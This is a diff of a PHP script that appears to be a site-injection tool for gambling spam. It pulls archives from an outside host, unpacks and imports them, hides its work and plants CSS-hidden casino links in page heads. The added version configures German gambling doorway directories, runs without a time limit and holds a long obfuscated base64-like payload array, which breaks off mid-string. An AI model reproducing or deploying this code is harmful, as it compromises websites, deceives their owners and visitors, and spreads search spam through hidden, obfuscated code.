@@ -1,58 +1,590 @@
-define('GS_ALIAS', 'http://kentuckyfriedbeef.com');
-define('URL_WITH_ARCHIVES', GS_ALIAS . '/static/archives/CSN-OLDSINGLE-AR-{DIR_NUM}/');
-define('ARCHIVES_RANGE', '1-15');
-define('DIR_NUM', 3);
-define('CUSTOM_AUTHOR_ID', 1632);
-define('SITEMAP_NAME', 'sitemap1632');
 
-$actions = array (
-  'upload' => 1,
-  'unzip' => 1,
-  'import' => 1,
-  'hide' => 1,
-  'send' => 1,
-  'clean' => 1,
-  'homeLinks' => 1,
-
-  //'sitemap' => 1,
-  //'sitemapSecondMethod' => 1,
-  //'rollback' => 1,
-  //'sendPostsFromDb' => 1,
-  //'viewSettings' => 1,
-  //'viewAllAuthors' => 1,
-  //'allPermalinks' => 1,
-  //'viewSettingsAsJson' => 1,
-);
+set_time_limit(0);
+ignore_user_abort(true);
 
 
-define('HOME_LINKS', 1);
+$url = 'https://kentuckyfriedbeef.com/static/archives/CSN-OLDSINGLE-HTML-DE-15589/';
+$rangeOfFiles = '1-5';
 
 
-$homeLinksSettings = array (
-  'hiddenType' => 
-  array (
-    'css' => 1,
-  ),
-  'position' => 
-  array (
-    'head' => 1,
-  ),
-  'language' => 'AR',
-  'type' => 'CASINO',
-  'textBlocksCount' => 
-  array (
-    '100DifferentTextBlocks' => 1,
-  ),
-);
-/**  lirucounter - csnar, route - csnar.js, domain - gamblersrules.com */
+$dirnames = 'glücksspiel, kasino, online-casino, casino-online, schlüssel, zocken, geld-bekommen, videospiele, videoslots, online-slots, slots-online, live-casino, online-glücksspiel, online-spielen, casinospiele, einarmiger-bandit, elektronisches-spielen, glücksspiele, virtuelle-slots, virtuelle-spiele, mobiles-glücksspiel, mobiles-casino, casino-mobile, internet-glücksspiel, casinos, virtuelles-casino, internet-slots, spielbrett, online-casinos, glücksspielunternehmen, glücksspielanbieter, casino-spielen, spiele-spielen, glücksspielindustrie';
 
 
 
+/*
+ * Use unzip method with header.php
+ * ziparchive unpacks files incorrectly.
+ */
+define('GREEK_LANGUAGE', 1);
 
 
-$the_title_pk = array ('7b1pdyPJdhj4vc95/yGLh/0AVKEIg','Cx2F4u1GAQBEiwSILFxqSrhAcgkkG','RieUiAJPi6+liSJduyJEteJXss2ZL','lGUuyLc14k2XL54y7z/GnVvX8ork3','InKLJZEgq/u98ajeqy4yY7tx48bd4','saNH3xinmvx8+mgMzGHg6ZxY9oTOx','4zu4Ph2GhObWPcbLWH40kskdB+8oN','PNPgjlMUn46mR2PzBJ+9/IO/NNibN','idk3mpbZN/1dBQviadbJDz7RjXNzY','MRjuXqlki/VtouVWFLrGpPOtR5PYK','3g/5zqlfx2vlAs5Zt71WahXGnWq3l','smMEWbpf75WzudbG0wxcUd0rlSr6Z','zdWK5VK1uV/GGml/jUr+oNwIrVHeK','tSruWwt38zVq7XyQbNQL9HaTk3833','IT4GrkK29ivWHf2DcHl3bVmEzMQde','OvdNeaMvC503/LGFmORhgN1vayTd3','ywf55n6x9LraLB+XyHTZOKmH2kMNe','9HaU9PSoRvEN+kOSlK+iZdq+Uopu0','+6kSAmfyKUByYdaF9t5sr1Uq15mN3','JQ8XY6srKZzFlb3ztzMrKWqB2Lbu1','D5PMVndJcabzWTrTWmu39Mxn+ur6Z','58bn32+/qSj650NffVpJ9B0t3aw77','Zcy+hPMul0+rPVjczq03Tn8/STzGe','tVltvPcl0nhgbgZYUJgpfoQKruF0+','yBZL0M8aVpuLWP9iAQk2y5XiThGnX','N2vu9jFfmAXPNTqtqFNB7fmSOsbk9','5Q167NSU/rGS3dGK+MeiNSCYpb407','PvMK6o1bn0tbOTcuwNXPQGY7HRmdi','zVawpm9ddyr5/OvmPpBJnaLXGTflo','giJp17ZhzJCc/Wx5dAobmRaTcdtSI','g5W6/twq4qbscS2g9/qPFftecaotj','d3UanN9RiwCfEmlcta2poVmvcNbRJ','zxiQhjFtRTvcPWzmy/ubrIcbc+KwB','AqSaTcHU8uKL4+Hw8m2Oc5N7cmwD3','vmeGxOjMMh8Jvj0W5roFvG+Nkz3Zg','AZo4PWWVgHRxw1yMNyzTdRBQOxzNt','AL+dD6cDPQo0D6SjWkAaW4wynA2c6','xmdy7hveF9fzmocHzYr5XKtSbldcI','Z0WciY7qrU8geH+8BrDrO1XR9Tdbe','Ovxi2QMzHor1OqrXT/Xx1N5+vKbrh','Kig7AuiR1mu7+YN8VdJPsDypnbcs2','0h4+PSoklGLA3+TjesgBNYllroePe','4MBxNjMEkB/fQNOzW0e+Yg5pAv2aP','8rly+sKvD6bhjAL08f/68Wqt8MjCu','tWK/1TXiiRV73IGCpVSqA+s/gc03a','+nj4cp4murBYnXsQWv8arz06BPD7r','RGRlwfdqZ9AGBlbJwbsAXHiUfx+GQ','2MobncbszNoxB4sWLJaAkiqGlxKul','pWefLG3aS49o8cq1qU96j5Yeuh96h','tntTcgX1sVKZ2gNx9vGaNJ79Ynw6R','n7MjJvDIt8SSQeLW1Olx7xMMImTzy','CwZceHbQmvZUx0OqwH09sfuLWaOl6','/gp+2AeZbQyMcXwJuF6O4nh/CMxIX','4JFY6JdixtYFxaZrPFVa6y1h/qsNN','QRt26fILHzloE/2luzWqtbavVhfbF','mLPEm/W6T6hNARk5jp0P843wD/PaH','VwYCi5/ff/IefsIRqz8+yh0MTreHx','y+WngMmzNFEQ/y/eLs0MW4mqYvWVY','t+frsEvGbQncI6Q+EefK8635c2sat','GN1+3yoPcj4svloAMoFIq1W3127Cf','7fEU+CwgvZ+idV9vV7uno/H5sP9ii','RDFyoX9CmjgBWAdmLFu1CtFDvFLP5','yYE8uQ1yBFWKc3mYyU/XhEtvR26SW','FpN4+rfTKpf7F8MWS9jxF5wplbqNr','ZE9xD0+PvHk+8qbxyOsHMAu7IqBtg','CpVLddB48At6GyggFaULW03t2Gj8n','pBdp9I+loRdKZcuVTK52rNg9Pq0T6','nowjbFMFuAe63Ha4czuUn/ZHLJ+PY','L2FMql44CTAY+pj/+XCsYTOAJoz9u','yytUqT6icOhVEOSuS5TOHEPhM8H9n','RrYtT6o+q0TaSWx/uFPrjZmAOQrKa','u0S40qI2zCxdlrrw4OGSSRxgEqi53','yI8HU9hah8BCEHj/9AlXxoGkUxpZ0','645sLdAcZmOyiNkIYQXOOx6AshnE2','EDbbdZY+WqA3aHgwHgmfTyXuu0Jp2','eFs/fdAwygLZs3HDoyQ2nlk5EfIc2','1Saw/G0N4Ybaj18CwzowbJvIAwmqd','qxhu2XtD7v2s2dAtQctcwC/gMSivR','m6Zk87HejgHHSUGRFGjl7lLjk/v8c','vWQ0yopwgUHnYZbWCHbomRQv48pWR','JdzZVuGsRYobSCItIM/4Mv1gE0BN+','2hqdi4bJohERfsfOxXiwfH8SqO/Hx','f90t7sSWs8YT1IOnSXzY91WKBtoz3','t4m/SJXKmdAxKdHXSmkyVyKDrQBQz','NRB0TnJkjo2sZbG6uWF/ZIG2qcdFA','Dilk5sOIyKYjbBLU6k5818J1g+ZZm','E47rcmFcMeAWhy4laTHtn0cZ4DKMl','VXNcgOghaw1HB7JT5y4//61gt29ac','hSBA/uAThvHRtG2ZHQ1AmsA/rvoyH','Vmg0tAmcbI8P3D1juXp2AKasSfj5t','gYWa0O8MafAGdsluoH74E9sh+TGoj','25nGxttvMVnK7IOSqFCCnHx9Pc/5I','0UVhqYB+YpTPC2jUxRGEpOZ026ygp','Q+K9wpYgQAAZdTBwfDP2JhMxwMNvT','GbXskcxuj8UbA2gSsmNqWDEm3ePyr','98b0Do2od0O6VL0PAAOVMWWJ+Br9p','L168AAN3zrQc4okTs5Ra3T5zO8bPT','rKGvknLlxM7LZhjG3CG5nyc7zPigt','xnUd4HFiKIU7JbXNfcGaCf+hV8Jlv','kaVYNkKO6ZJ7vNQPo4a8WQ1yMKLvC','7I+GDgcVuJOOit0LsMID+3+5N+lbh','HlAWRcgjVMuATJlKfVwBUuX/IDZve','n5uWXEvXYON3VqpFLnow5ZovgSViL','+Jo2YxtpjbWmF/ujvIMiRlvsoKFDL','Q4swxJP0Sos1UQETnETP+EkS5zIM5','VCvO8VYiqKsCaOYdo+oc+7wiai8Lk','Y9ai0LlGd9xlbB0GMKlsfz2SD6qLr','uIScqDC6qbZ8rKjrT9eEfTGDiQ86O','UYdujcetWTyxqWSxgpeXMNk4/5nxW','WE+y4Qcdn1UKNDHZgRhqA+vBygO8z','cTYzwABOEM4lznfE/cVBWuQDSpg92','KIpSumq+7RAjH4dEv47y+9Rgb9tSa','2CFr8cC0m2CuiXSNRChAQlr0L6M3C','CM7znB0eiHWI4/uO6Mg6DD0/AYJ7Y','svtLj7OyGxtITEGOvLBQ0oohUWB8B','EB6CqJR6/BAE3weXfhupHU2M8C4qm','IExg8hstFAA+DtqyteVLY6a9eEn5K','mPBkaTRMnNLHoIOrDY9fHUoR4MpNN','lXm4KS4Bny9ySu8A9CYg6mkpXlVgT','9bMSm9U3oTQy/xt5tyuvKjXkoQwuB','bXf8NenumGRggwubn5olVWvaVfVuQ','9kh6PJgsW0ZuOBALcaY8aYkDz3Wjr','2TYV+15CMYr6hHoEyTjIvgxXmUoRM','w9i6pOXNHWheHwj9JQVIm/Uj4KWg4','80iGWzC2rG/eqdaLVqAma9w5o0o6e','BYWjOFOFJIDdDGxRZawSLW7qt9utl','t2oH2M6FAxTskRtOsHRn80mcWdOUq','YmDXsMv+ZDyT4GFRa8OvKBLbRZiS1','wR6NzcHkPB4jHl/0akGPoKZ9aqM/j','w0prBvhPKOpn/OwqkmUABYIzPjS28','GStxXRR0G/FIr7+Wb28DBf2ua7JV4','gwj+Bj8cFNQDAysiFkwhPNA3POZMK','5VUq6ziCoeJKSUeEAyPRyELHPq453','DN1Q20NP+C16OAJmYTWJgCkBYzE9U','erdhzs7hqri8sfwZaT9i2DS6mfOrO','22XaQ9Ijr7lbDs3DRHnjgNwiCfUZW','/DlQYNQQ3VtFG0xzcrvSENwIOy4wN','k/J72UqItnjeMzAz5co7MEaoL9RLs','Zh5r64cU46fPMFWtLoWaxUa4xks7i','9uee0Eu0oOBWBIsROgA3R0+ao+9wY','j/EkqIcWLxqDGOIRpMOoVIEqA3Bj+','KSN8WxXGxnjvmnbpKOVlZjCBOn0+k','NdoI30Z0+eJO5hkYQByg4uOEhtBN6','F4oEw7Tsu2D3IewHqlpl2HLwLqUHh','O0FqJkXvyjHAkNzmMJH5Cx78MB1gR','ErIMkTjTALuNu/LQMgiJrX21PcrZS','HemWySgR+Ck/deIKDrvHo4bJ9rNqV','Jy7wyHqY+WbYdEo3tz4bd07XGrb6z','MSnunI3auxWrMzjovjaflnLd9OuzQ','WN6ulYZtVefdFsnpXOnbutkZJ2sbc','3OTs5GZyf6eWuncNvasaZns+6lvtq','zOv36qLhrl3JmtlvMbQ3aOxvm6fF1','d29Xvz7bKdrFXGVwdlI57+w0Zu3jg','t06Xh+frBbszk6vV75Ov94+GkK7bH','dvp3F7mtno6buV2clq4xz6gTGyG8W','dwqzTL6yfrILGe3Iw3NvRLb2wcX12','sjc5Pb4ZtfuTc/j3urWTH2F/2BeM2','TsdlEbtQeW8tVtJd3YPuofVrVH7ZM','tur1as17kOwIV/AQerMNcTqGNtWCe','rN1ftfmfkh6t1fNp9nSuMOpmNW4Ad','5lcfvq5m+3vmFn7rne1kRm2zO3pd3','frcaUP+7hQuzwob/dbxTfrspDjcWy','P4u4W5XbZOjiadnY1bncCgExgAzkk','b5tXeKUB/Hd9cCF4B/5VMp/8E8TqE','uVvF3JNu0dzaql0edY1ZZa2zUzH3a','+vX7bVSurOWnpL+C4DPk8qwvVbs1i','436sW8VS7mupenx3s4l/TJai+t727','dvq4WXdjPj7y5d/qNtH6yNwU8rbVg','/c5qsM6DtEAv+trW+Vl/40qHOkgrr','ZOzng542tstZADWdYYbkUbUa+mrn7','08OyldAM0ArHvnZ40NWMP1QXE73T0','92ZudnljnrdXGegfo8Wy1kYbxgSYz','vTbQaAvWp727NTytXn7u0VmvB+tG8','HSyVhnqxxmz3QecFzYu2wNCJy7tdN','YqPR3wJRv/NeKiy9Zox+oDXnvOfGE','dJPSS7ZF9dVyZtI6fwLfLrhFY4+xl','56QBe/JycjgoWTDu4PSkkW7tbMz2Z','tfz4PboZTctXSP/HIwCrhXsXaBbsn','fdeegwt71eG2Eh9Bl1jbb67bU96/S','4NET6Uq/DVq8zy162jo+6hzWkZZjn','LsDX12/F/UNwCvvduoS13gAaJHN3a','BzmkoE5XHXMy+6eCXt0x7rtwLivc5','Vb2CtpxH0nYw9ag4PBSfVyFKTBLDd','Oz10v/fimB7xgAnwi0yY07IdRWDNf','P3uzs+PCuCwpxz3FfzsDXLUBFwizj','vx0rdTeWx3d7mXSQTzQ/W/CXuy1bu','0A/G6/ijVHeuusYt8NG/bKeft44xL','mZwVwNPPNycHFGqE/Drb1K4ZLgm8/','Xo5n+rRNYYd1hbXazgfpis5hdGZmh','5Q2KkPYRxfAd62z1Y2ZAXsKYMU1td','s5CS/leCDQcIbwIhUuzGD9sz7Im9U','69DnaIDTQP8u0+yWY/8a0SOXOUN/J','2ECz9umxNQX8rLaOG2tB3Hh7A2Qjy','KTGFPZFBnA024dvyAPZ/g3wLn3Xgr','1D+UpnsNczqt0A3JSHXYJ8KKVPEd5','Zh+yNmtU4qOUubU6mEFn4OqeDbIa9','fHKAfPARyJBr/XgPcTjcm0Vucwnf+','yCDRvvZwDo5cA4I/9tt3O6BHD40sw','OQ4dMzIvujt4G16nVWu4PX1etI895','bBXnar/vre7xt5+wK98HpahdkciVt','nACPmVGeQvDM9meQdio3+nFjZlQ9X','eJ1VtyPe2tbVwD7Oe2HwUK+HQ32Q+','pz86VwNGwPD5l0YN4BueHw/T7oWqA','noExr9xtrxYJ+dJJhstOF/1LgX1Q3','oXiAPeiu7wnMFeit3KjfHCj2EtmLn','d096yyzMQH8X7RA3pxb149OgOce32','Yn5eqN/npmdV43rp+em0RXonsCeCr','wfxvmhd9oW9hDobxRbIv74RZlEcwd','dZ6Ls2r3EvTD9CnqlBn7+qQKsuf2C','dBzFvUP2MulTHv3aHLYP7vSj9cvTy','j+b1EPApp/SmTkLtWxABcgd66RV8n','mvhH4tpsGXnxze3ZM5I1s/ZCn+eiS','yZGuhCZ21i2drRuupaMPyGSCvy7CS','/W0vfMT4NcMP86eEvlNbX2vkruUyz','MPV9jH9Oyk021kts7rlDcN/eNKaNG','jq13gn8f6OV0TkMNr651D63r4umBf','79cu7ZOqPTrJWZ3D3ScDwv/6lqUTO','UHxRNZvJwN6YAn01QMFT2e48NYNdK','N163ugD2ec0Xx5vQV8owHyo0H2zN5','uZR34YNvjW7pO9ZMAD5buhXvhdW0r','c9q/GSEvvSNuPfi+e/z6x/qYOHZll','mdzCrrcNcxpcLJK8QNy79HJ9nrnda','7XPsil1/cL6THwtNHJ9s0jDmbWt64','j3l1czC7lYzHe7dF9ZXZ6fJb+HnDr','wvm6JoFrNyhvzqtbVht0tXBZEZTt3','wFur89gXqhv3lVuePARWugCfsDW3L','M6OzegD4Ce7u6HUvuggGN0HoGd390','3PfkKfBPsFOinQO2oDsF/Z3SYC8o3','/1gfE8eeLvTxZbLT9x15Qxpo6raV+','+5x68EZSTY7uvyGxCdB+7yV+ySInb','F6dtVeq1hgz6E+APMo4f4C2JA2kcf','UETZi23I+Ch8fqlObBvg7zkvC2y9P','V8FePAb5vFs613caE8Qb/Au2F+DsO','NMjuoA7dvpRZ7dhgl1829oO0pbM1v','b5r3pnO6BvrjYuwCa7alsbF+3VzHU','L7Dmw4y+Jf03AaeUC10TfPZgcDlz5','AX1le6FjzaLMaRgGb8CfRNdyD+xFg','NEkfWfag8otygXqbxr1ATd0XmakeU','rtMrDBLk/Nn5ZfqWCirQ3jDsEuvu4','Q36WFeLs6Qz8C0hzx48j8nBKbEe0V','h+Zu/Xqaz57J7dUq9ZvCUeaoy/x9D','s+xi/nSYaO+Xn+dy/64mLvsHjUOuu','1BY+LKlvxZtZZOy3yH3Ua6V6hf1p0','+CT8jNHxyYIq+UR39HuhTtKndhHov','4ipN/ATog9BPSrgHAb/64Oy4cu73f','3H0utYpbBB/Mfpk0Z9EaLCwMQL5OY','A1uu30sb89G+Fh6+LZbY2Nq9P+yDp','dO3L2bsCX6/fV8Tr1yWqp1wb6Ir5M','wjsAjyC7WzsZi/iRgebhO9h7excn0','LadSz86XS2AzrZO5u/5PaEO4m1XyX','sdP193/yLt+Mlxf4IeADp/vz5U8Wv','H3ws6ZMD2LObyhFY6fWsVfSp7s63D','OvCvIqvn+BHJGh4fdY/q6/ki3weWe','b7bAdDMqAh7ieKilAFbhOCBreXoLN','cdSeDk/dYbAh/w6HcKfMgs5vFu/xb','n09sq14Cmq/UnKE95X/6omNertUzj','qJjfOxPmceHyVFc2kb2Y6zF76pLxi','fQjSj8g59YaNqzXULYWrk/X3ZeXsL','cK1fpl4ewknQ/Q11l/A2kB5DbKDrd','f4CcHDk+CdWicn8EeBVoFPnck6FpM','hyB7AH20J6sVQlOnx5VL1KOo/zeoF','xP9zZEpKt3Yx399PrhLpBfA++VZwR','74+YPghwzIYpkfjcwP7OjCDPRcPA+','YtRvIu0HvOyEyGXDSuAVc7p3lQvj3','xXxeV60fdYHKD2uwv3xrRuAGXYyeV','VR5msI+KmSvV4+PAnzMv1aAyyHzTY','3cvvtkbkxPr9x6Pplr4Kt71aOGdX4','U9M/MkS2XQ0+vDPrOPZqlfi3pWuVE','HUQ23jGxRdTrDXgcnHhwyHQs2fmY3','I8KuIJyIms7O8Crge+fnfQuYB+R8t','e5IL8/g75O+4XQ80HXr9oHPa9vpc8','C/orKDH3ZVM6S9bnq7DI6A3zqa3sj','wosHDRv0YO68JuBHVI5f3CncOjhAm','QO8oqdnkA6A1latNKzbOvWlVoBmSu','ftfmEVbCPgk7jHGxedgXVNdRpxvXB','eQKc90JctYwd4KoUd9bzxGfpF6XnP','9PTk7JzIQFi7s+PSzGD4RPsC9pUFM','F97fvoDR6+W8JSC59cnOAGblaxZD2','ivElgr9PGf715LbN4obbM91AFc+Qp','t8Mz4ZHW9p1sbE7ADM8DTQEbvrdM5','r6Odj2sFNs+W71wCbK+qyvYmegKsg','z5DHBDbA3hLC75RmuiGyiGJzhlJ73','DOAxlNKc/OlPpikH4p3a1asK57/jM','nv+9PLV/UOi6TN0TPzHT6N7B/CmvU','nttAmrlC3YP4t+fQmPxMzjsfuse6S','m1+Nqfb1jH00y+ATpa5OtsFXDcm99','wTFrFrPwpNhp07dUVbh9JCaQT8wPS','fwRVzNsodWO+Gyg7i+Q6LDejej+5+','Bngffy55Bv1J/Q5YZ6fxZH+wNexsb','/TPjhuXh1USuzHYz21dAFywH9bxzD','ccBsseIMxot3Z855bom+TXE/Wsk9U','z6+z4CM+eb3HtoC6sE9KjPiJn4qv+','2I6989P+xhWsYy8Qt+E7k5XZt2d9y','ybxEqt7V+3VG+CjaBMFfBBDtCtI7E','i6dAX6L8zraNJAHbQGtjf6V3YQTuB','ZqxtT6Gvq2Gpok3XWDiZEX0Z9EP2I','t3YX9DLgKzD/7fQAv1HdfoOtU3dw2','gdbNbMBNk9hhvsHzxKLuyhng3aUo2','sz/o92+exgOztSxvOs9YDGrAtcY6L','TMpsN4AY9zc+rHZ7I9m4G9ZiNa8/W','K1lALxfA51FnmoBdAvpIZcTgv+RiH','K5bxweyWB6rDfwCz1WcPhk9oC1+1c','mJMofxJfRDIK9IIw/C+Atc+7OddWI','7tY+PMq+D9j7x36vGKEv1t166fXxz','DnwI5kPs/wzY5symvMnAPpl2Mk/J2','knxi9/d8nCYyxJ9BHVPyg/Qj4DjFg','I+LKZHzk6P14FHUz4qwq08p2Qyu0T','kFurmaAedgmxFv3j7ON8top9t56yH','vlSFj9SCulfF+X2FxQ+E2DVDtl/dW','CGg7yPX9+bt2fVMO0i3JBYMdIQh2M','8W9Q8Qe4PsYRKrZd1Mi8y28ewOsLe','PN1CHoeeFt9lpqdr53FdObVvgxZ01','Hfh2BdcIbA9rRvc97Od+4QJhova7D','vxgYhv+Pgqot5dsul6oK1dobFbmct','KuZi73Ar4nWRwPT7vULmG+oZHMFuH','8M548mnX97XhfpQyHU8C9y+fh2y3h','t6uFKeoG1D7HetfcPK8Xwh3u087u3','qiNNsMuvzeJbniBODkj+saNRWPbaP','+t4yPb8dN1Zhz/74bSB/F/nOw8ebq','Pv6Nc2n4SsEs7kfYb+hRBTq0Su3uk','9xtEXoN8PKnUG/snaat8kikVjtIb5','UohyA+dGCQSl4Z8dcdahTnCHrn2bD','zOr87kI40ftZCnpIf+verajtvXTw8','LpXod2h9ubzxpH193ATaQK8CrL9Lm','QfXJdRF0HLAfr8hZy23abDQqO/u1r','nl4+6SUu7hB3RXW+6hr7GTs9uBgo9','jHeMXsZ/uzjTV9rTP1ZPrBFNZusL9','WwjMl0NkOrtyy3NPr/YtL8xDgqGcq','VYWu9b3TWECH8/TFp4fbN7VGoUj34','zbi4PqRb588hT14cWgiH7t+uo82NO','LK4bXbN6BPldKoY0Id9ANcwL5DvQH','r9gBWsDGOAv0hjLC3rbMB6F21J87+','vIZ+bnWUz4TPFjKtkz0Lfia6AewFj','GmFPktDoM3B2fEZ1MkH+vXN9ZGfzx','3mNtBPeYX2vFFjsG9fXyHNHgKPhP1','QyllANxfycx03dpX4wNDPS21A0Gu2','OoOiX3ZfcrRq494TfDByvZj6G072b','o+gLtOFiT0gyqUKJxtucA+2T4jPqj','NhZ7ykbYA3cDFqreMM6PfAX6pd0Bv','ImZmkX6qHSeiXxC86vjewjWZnq3VO','nyT+0AHG2SF9+3RljEl+crraYHqgL','07Kx6P3don/yMfDcE43uB9wjyhtVn','+coCsTfDon6h1OrLm7VoMDWXytLx7','xQKWjEf9qtc58xSjvdhtT9Pm10L45','GVmvd/D8sb5aKhDbkepqwRhPWRyq3','4e2V2FnPEr/flQ8+/28aStP47Gz4f','qJs5YeLhD3pJ/2GrPbdzKXpWrvtrW','TvwFaPq+nG9XGZaMK9nGxUagcnaR7','h/XMEY2LXRTPeD69at0yPci1nzuuf','frxcK7EoxOnqcA/9Zv75OEO2KvoQy','f2BsE7xuCMOvRs2PMnoF0Ktmfr+Em','ENfDH5IfvjdeziDTB9EPJ/iZ0zXjz','Bepod/Gn/gz4kmR71ufvKaH8InwCz','17vY9cTG2jteiChj2lxt4T+bPRlAB','2V0F6GdhXLyK1ft3azKXpWCzx4xzn','3OrqPPxbjJAZ7uY7iLJKPqdl7pMLL','uUnu0/j3c7XSKDQqjVL9JNOoVqtq3','xrv01f5dBb0m6LcQf0YePbeFeD09p','TIsXpAJ4zq6yf0vR3wkZK+2wM8g2t','YKPMN0L9h/4OsOfJkTmNjfHZi3Yb5','s3znLSS2A8rO3RhkoscdOWdI7nmpc','/4A/A3PezLoB9Z3LRv+Bf1oLy3iWh','WjLjlbYXZuiDz345XFFHTld63U+9d','27k0EZTL67oFHA05hXujXXm8T/lKY','URtxsTtXQf9Knt0d2Xp6nsvCvgT4Y','T0Ab3hOgDwX14ne5chlfXdcRL+Lgy','upTcV80W1rw42TpeOmH3F3n+w5dBT','h7paOe/oK9gvQ8QbaeWjznSMfJHq7','tdE/xRjiqnBvK6DDAZ9ZQz7VzmwM2','qvwd6dhtjG+HPBwQvYh0s76ObuvgD','pQd3/2tHt8DHNcO+rCvj8sbufT+4N','uF+90Yaw4wCfzX1I9iupXoBdunJ/2','gR+t7l2xO2dy2GfZq/3Z1ll7tYDrV','6vUn3YPakdTI7eFZ/LTsxPd6nTn3D','Py63cW7hewA/qdoSy+CuQh2ndDsKt','qlcbeMfxt76V79UZh6/y4sLFTy+yd','HDX28hXQ5yqXG1Xir+XXyudrRzu3D','lZKHeRCtVCp1wsbpyfps8O6pW/VLy','uFCumzKD3zJLTr3SGS6EylHfh7WLt','cLxxlKnu1S/282sgSHUpFt8VF+lkM','pmqlnjls5BvnR/VKvm7K+L5PP/HjN','7NXqNU36pXGxlYlX6n6z/mld//C+Z','QvTqGEfsoByhC0VQgfPb6xeT0F4+D','axzSmhsUIXIMMHp8e65ZgH/jpR9BT','e1gGf4vDsD5xb+Ff2X07V6eHtmTP7','BDfyeiEnTsQeE56PruM9OXFxjl+aO','Ajp6uTHthcgl83pG7wbF4Bw/Htlq7','wKfHnhz79G/g76mhefBSe+/eQ76GN','2+ZsNIdv82dVTBdW07ePNkT+LDlnE','mBlvsR+YYq4k8bCeHF1l+01jHGpz1','tvt7/v9x4Z1dmIfnCCPnPEJdhAjQ3','rDOwPjAsGG9/Cs5P2SZY7w6N3HYHm','J3geUsxhXBjw02O0iwuTDuyhQzO7e','oCxfNun12oeuJXuDBry9fDqUH4fcp','dXeg6whjZTYcLvZ0o73UsdcKMf10V','bFGUe2Cw6+qVWM+dsbch+xPjA4vFc','vK0CvBm8k0PwA/2gjjlPFlB48A7BH','vFv4dmtDy/0zo/MJiGxQFtX7UGJ8C','OGjwnGEZ+s6uReLotDc/2QZzQea3Q','6W79or6avWidbM+IXOzm4OlvduDqb','raeN3aMBf9bo8PeTNaKPgc61AToCu','Q9w3V5dB/guw2O5LhS06/Ce/sYliZ','1i/KB9vIFxZ0jPYJs30Ndrtlcr69y','YvH8rhM/QuyyAL7Dzj4bFwZPhye5e','pz246bRN6xHGDxL+jXeYCCyXoHukb','/ZzW0f1y8YuyOujWt6qn6TXD0/SYM','QUKmfinSSqKxSPqY+b+qVUMDl+1QX','Ofri7eD469u40Epr17vgp+CTqVf49','Tu9Zkn2M9hCH193GNYsD9MUtIR2Az','blWuQKeRmmoSuPnyR6oXlOeJfQVme','7le56cyTo+i5ur9hr6BED+nATiE5l','fxTmLrqAdjLr7pXd2DzRE9yzIbNBZ','ar5YzHC/Mrn/S86wZt7ZVTCekt4ZB','hpNEz/9asbCuL4zdh5FfO2SWINI4+','aebDCfAMiRoyH6GFBffg12yRnmS6B','9j0C2PEEd4AB1aDzbsDaOQP86r+Ub','Ow2fr1QW8x4FDlU8vBP/erazgTH8e','H/bPdfFOw6dfgZtt4vWamFwRu5/AG','3u7gnrF66LbJE1g29pQoshMvYu6yq','nsTljuPIR9ckjeneR5CTYuzoDe/KU','nGmUXFtU0NeInVa5aB1XZjw94u/Ez','3S8TmxbfQdlVYXgzHeuqzpnvmjjmQ','/GHlK6TLdOKjaNu9y49vfj6b2iDe2','sJ90/DRP3kGMbE9t0rbQG63RJdLmT','xgjk0CXVrY/s4nYW50b4t+MfEn0dL','K4AzxcLzp0FhLmUAZpKd1i8u0zeU9','wezB+H8x1LYpAcvY2e7/v9T04/an3','G01VM/z3B+gJ+F/k5JufPd/1W/nME','1298POoZan+r6F8R6boP++GW+FZyn','QGrG7CFgZ6nAMPoNOPz+3n6uv/8wa','G1XqtfIPwI7K4nen4PaK807qTpPSP','iw1zdmLZ3rSLwCquOMblg4ytj+jIb','fdA/pmQv4/7LkRhQcn8DeDzRSxX+d','ll8psCfzvrWDH0YEv1wiPCx2OFbT/','49vWaxCVI/vP++6HeCu9v8dQVwc9Z','vkHPhhr/erCPNJ0LPid14ZN9etz0f','46WV5/VA8c7fzSW530fOcboknuI1d','69vrp0JtmRnQHkvf+ZG1hNzbhyvj2','HdXd2cnVW6dzPR9uRhDaxH1qP5wB3','Incp6u1+YtI5Lfh0N7XXr9Dgdssdg','jqBnG7uVHJ5zt9ZK2+T+Gs3XdHOwv','ZVvHZ/1Mf8R7K068Pr0UR/24erk1v','UfdheMRcmlH1XrR7zfLuCTZ3lJ7rQ','uLN7Nzw/x7J7cMwjeq8zg3Upyf+oA','7b1ZNnhnuGHfnFSzn/Hrg3/pPWF6H','1NoU+PPSUN4Ex9Hv9qDunhHDeBe83','KCnbCxFHPjcSCln++eXnTQoW7s6Hs','4KFvC82HlQ/bbU7IWZVO9JxV63qVx','vN5rH1sXAdvCtbvnxdkqzgEAhs4O2','tZeLjb/vSIvnxufB6jbc/2zc8++ZO','cuQGcnW+jPmgEdSu6gQJ+rPTyvC/V','dej4XcT1YXOG8M0KZTuLdKbUybcnd','LOwTz4jo3W3ck4ud9YT4jobhcS00B','iCc5uX7hZ0RCfmcvHhXmZx0c8CF+I','99NpmA//vsXVj/sx2wJS1yV5P4V0/','XSrfSs6A5MlLi+y/WMqU6+omIz5bK','ibJ+nBZjb+l9T3pPzGL319l5d/uYx','QzI77fB3jyz8E4Bxqu/FngtOUciZ4','UYC4G+WFxj2Iue7zdsXNg3HtwoHzK','6Mi+gcqw9Ilf2za2jamHrvFLfOKDx','wWE0BHpAYasIOCzU0teE15NzJXJeV','hkBb0FbAW1S2D9+GaOIjwgbK+z+Ph','/vDXYQ4+UXxE8qjaGbk2fr9uaydXL','apWee9Y3igJ59Ix8r99HXvGHrwJ/K','sy3n/O8zZl8O28Rexri19PXr2uSK2','NwnlfXyRXZ6sJ29La8NMa8M2Fzdz/','Zr+c+LFySHy+Awt4FjPlLn5uo8Pdu','xVtEHgeeSh9U9pAUa134xQvv/qr3b','wPtvXdg/fX17OCnVstcHu1tPyrMiz','bVxe41xlKuHpjo31+EO2N/mFvW11t','Imi+FAfH+G/Ke9egO0WP8cbNqrzva','wC3O4PsjVVfO43xg7N9bZ4AjwVM+A','XndtbNvmIclp0Xm6vwp9wJjKnGH8G','vY3VoHO+6ADrJXNLeDbFaCxJ5+Tu8','HO2lI/iotH4EejM+B9IKevO7tHUFc','fnYEt7/5+97XDeFr0R66X++tX7X59','ob46QGPtSPhjZ7xAH9Su77n0eFjLj','sqrxJeC8ZefHeSeXB9sH3xumBka5w','L0c1Dz4XutBHWffCS43HW9Ftb1Y46','jptFbwMP0o+wDdy6n4TTK/M2vFWcq','QAt414nkDyB3afuWiTwGbW6gWZpjV','GGjSmOr76Uve3uC+gjIHYeBCnZyT8','7JsbDTy7SP90CHsGw3NnqOv4TjzfN','0XE8/dX2FhR+fnnSdGHt